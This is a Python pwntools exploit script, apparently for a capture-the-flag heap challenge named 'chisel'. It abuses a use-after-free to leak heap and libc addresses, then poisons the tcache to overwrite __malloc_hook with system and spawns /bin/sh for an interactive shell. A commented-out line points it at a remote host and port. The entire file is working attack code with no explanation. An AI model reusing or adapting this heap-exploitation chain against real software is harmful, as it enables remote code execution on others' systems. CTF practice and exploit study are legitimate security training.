from pwn import *

path = "./chisel"
context.binary = path
e = context.binary

libc = ELF("./libc.so.6")

p = gdb.debug(path, '''
    c
''')
#p = remote("45.56.98.206", "31447")

def numb(num):
    return str(num).encode('ascii')

def alloc(size):
    p.sendlineafter(b'> ', b"1")
    p.sendlineafter(b'size: ', numb(size))

def free():
    p.sendlineafter(b'> ', b"2")

def edit(num):
    p.sendlineafter(b'> ', b"3")
    p.sendlineafter(b'data: ', numb(num))

def show():
    p.sendlineafter(b'> ', b"4")
    p.recvuntil(b'data: ')
    return int(p.recvline())

def chisel():
    p.sendlineafter(b'> ', b"5")

alloc(24)
free()
leak = show()
heap = leak << 12
log.info(f"heap base: 0x{heap:x}")

alloc(24)

# tcache stash prep
# chunks added to head and taken from tail
# also free libc in the meantime
alloc(0x440 - 8)
chisel()
free()
libc.address = show() - (0x72a50d01cc00 - 0x72a50ce3c000)
print(f"libc base: 0x{libc.address:x}")
alloc(0x460 - 8)
chisel()
free()
alloc(0x480 - 8)
chisel()
free()

# allocate chunks so that largebin remainders go into 0x20 smallbin
alloc(0x420 - 8)
alloc(0x440 - 8)
alloc(0x460 - 8)
chisel()

alloc(24)
free()

#leak = show() ^ (heap >> 12)
#log.info(f"next: 0x{leak:x}")

# now that we have multiple chunks in the tcache, we can do tcache poison
mask = heap >> 12
edit(mask ^ libc.symbols['__malloc_hook'])

alloc(24)


# this is the poisoned malloc hook chunk
alloc(24)
edit(libc.symbols['system'])
binsh = next(libc.search(b"/bin/sh\x00"))
alloc(binsh)

p.interactive()
